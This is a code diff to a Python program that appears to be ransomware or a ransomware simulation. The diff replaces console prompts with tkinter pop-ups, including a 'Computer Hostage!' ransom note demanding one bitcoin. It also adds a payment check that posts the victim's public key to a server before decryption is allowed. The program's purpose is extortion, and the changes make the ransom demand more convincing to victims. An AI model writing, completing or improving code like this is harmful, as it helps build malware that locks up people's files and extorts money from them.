@@ -7,6 +7,9 @@ from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.backends import default_backend
 
+import tkinter as tk
+from tkinter import messagebox
+
 import requests
 import os
 
@@ -116,19 +119,22 @@ else:
     with open(pub_path, 'w') as pub_file:
         pub_file.write(pub_key_pem)
 
+    messagebox.showinfo("Computer Hostage!", "Please pay 1 bitcoin to address: <insert wallet>")
+
 
 pub_key_pem = None
 with open(pub_path, 'r') as pub_file:
     pub_key_pem = pub_file.read()
 
-usr = input("Did you pay? (y/n): ")
-if usr != 'y':
-    print("Well come back when you do!")
+usr = messagebox.askyesno("Payment", "Did you pay?")
+
+if not usr:
+    messagebox.showinfo("Well..", "Come back when you do!")
     requests.post(url+"simulate-payment", json={'pub_key':pub_key_pem})
     exit()
 
 if has_paid(pub_key_pem) == False:
-    print("Oooo you're a little liar!")
+    messagebox.showinfo("Wow..", "You're a little liar")
     exit()
 
 with open(key_path, 'rb') as key_file:
